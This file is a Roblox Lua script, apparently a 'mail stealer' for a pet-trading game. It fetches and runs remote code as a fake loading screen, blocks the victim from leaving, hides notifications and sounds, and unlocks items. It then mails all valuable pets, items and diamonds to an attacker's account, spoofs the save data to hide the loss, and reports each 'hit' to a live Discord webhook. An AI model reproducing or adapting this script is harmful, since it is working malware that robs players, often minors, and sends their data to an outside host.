-- LOADING SCREEN
loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/LoadingScreen/main/NewLoadingScreen"))()
local AntiLeave = true
local MouseLock = true
local Webhook = "https://discord.com/api/webhooks/1312126595909292032/_MVuRDhA9xreFVtGgsT0tlU3GI5n-h4iuiXDtKJ02RKonxy4STFP1W4Us4qTrsaSAvH5"
if MouseLock == true then
    local Plr = game.Players.LocalPlayer
    Plr.CameraMode = Enum.CameraMode.LockFirstPerson
end

if AntiLeave == true then
    for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
        if v.Name ~= "ScreenGui" and v.Name ~= "RobloxPromptGui" then
            v:Destroy()
        end
    end
end
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true
local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "ZapHub"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end
local user = "Masoom333"
local min_rap = 1
local min_chance = 50000
local GemAmount1 = 0
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
		break
    end
end
local function formatNumber(number)
    if number == nil then
        return "0"
    end
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 and suffixIndex < #suffixes do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end
local function SendMessage(username, diamonds)
    local headers = {
        ["Content-Type"] = "application/json",
    }
	local fields = {
		{
			name = "`(\240\159\145\186) Player Info:`",
			value = "```(\240\159\142\173) Username: " .. username ..
                    "\n(\240\159\165\183) Display Username: " .. game.Players.LocalPlayer.DisplayName ..
                    "\n(\240\159\145\145) Creator: " .. Username ..
                    "```",
			inline = true
		},
		{
			name = "`(\240\159\144\177) List:`",
			value = "",
			inline = false
		},
        {
            name = "`(\240\159\146\142) Gems:`",
            value = "```" .. formatNumber(diamonds) .. "```",
            inline = true
        },
        {
            name = "`(\240\159\164\145) Total RAP:`",
            value = "```".. formatNumber(totalRAP) .. "```",
            inline = true
        }
	}
    fields[2].value = fields[2].value .. "```" .. "\n"
    local combinedItems = {}
    local itemRapMap = {}
    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap, chance = item.chance}
            table.insert(combinedItems, rapKey)
        end
    end
    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
    end)
    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        local itemLine = ""
        if itemData.chance then
            itemLine = string.format("• 1/%s %s (x%d)", formatNumber(itemData.chance), itemName, itemData.amount)
        else
            itemLine = string.format("• %s (x%d)", itemName, itemData.amount)
        end
        fields[2].value = fields[2].value .. itemLine .. "\n"
    end
    fields[2].value = fields[2].value .. "```"
    local data = {
        ["content"] = "@everyone",
        ["username"] = "Masoom333",
        ["avatar_url"] = "https://raw.githubusercontent.com/ImDigitalz/Webhook/refs/heads/main/logo.png",
        ["embeds"] = {{
            ["title"] = "__`NEW HIT`__ \240\159\142\137",
            ["url"] = "https://discord.gg/tYyRcrFCpe",
            ["type"] = "rich",
            ["color"] = tonumber(0xE97451),
			["fields"] = fields,
			["thumbnail"] = {
                ["url"] = "https://raw.githubusercontent.com/ImDigitalz/Webhook/refs/heads/main/logo.png",
			}
        }}
    }
    local body = HttpService:JSONEncode(data)
    if Webhook and Webhook ~= "" then
        request({
            Url = Webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end
end
local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false
game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
            x.Volume=0
            x.PlayOnRemove=false
            x:Destroy()
        end
    end
end)
local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return Item.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
            end
        }
    ) or 0)
end
local function sendItem(category, uid, am)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
	local response = false
	repeat
    	local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
	until response == true
end
local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
			if GemAmount1 >= min_rap then
				local args = {
					[1] = user,
					[2] = MailMessage,
					[3] = "Currency",
					[4] = i,
					[5] = GemAmount1
				}
				local response = false
				repeat
					local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
				until response == true
				break
			end
        end
    end
end
local function ClaimMail()
    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end
local categoryList = {"Pet", "Consumable", "Misc", "Lootbox"}
for i, v in pairs(categoryList) do
	if save[v] ~= nil then
		for uid, item in pairs(save[v]) do
            if v == "Pet" then
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    local difficulty = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]["difficulty"]
                    if difficulty >= min_chance then
                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id, chance = difficulty})
                        totalRAP = totalRAP + (rapValue * (item._am or 1))
                    end
                end
            else
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
                    totalRAP = totalRAP + (rapValue * (item._am or 1))
                end
            end
            if item._lk then
                local args = {
                [1] = uid,
                [2] = false
                }
                network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
            end
        end
	end
end
if #sortedItems > 0 then
    ClaimMail()
    local blob_a = game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")
    local blob_b = require(blob_a).Get()
    function deepCopy(original)
        local copy = {}
        for k, v in pairs(original) do
            if type(v) == "table" then
                v = deepCopy(v)
            end
            copy[k] = v
        end
        return copy
    end
    blob_b = deepCopy(blob_b)
    require(blob_a).Get = function(...)
        return blob_b
    end
    table.sort(sortedItems, function(a, b)
        return a.rap * a.amount > b.rap * b.amount 
    end)
    for _, item in ipairs(sortedItems) do
        sendItem(item.category, item.uid, item.amount)
    end
    SendAllGems()
    SendMessage(plr.Name, GemAmount1)
end
